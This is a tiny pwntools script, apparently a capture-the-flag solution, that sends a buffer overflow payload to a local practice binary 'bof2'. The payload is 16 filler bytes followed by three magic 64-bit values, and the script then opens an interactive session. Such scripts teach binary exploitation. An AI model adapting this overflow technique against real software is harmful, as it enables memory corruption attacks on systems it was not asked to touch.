from pwn import *

exe = ELF("./bof2", checksec=False)

p = process("./bof2")

payload = b"a" * 16 + p64(0xCAFEBABE) + p64(0xDEADBEEF) + p64(0x13371337)
p.sendline(payload)
p.interactive()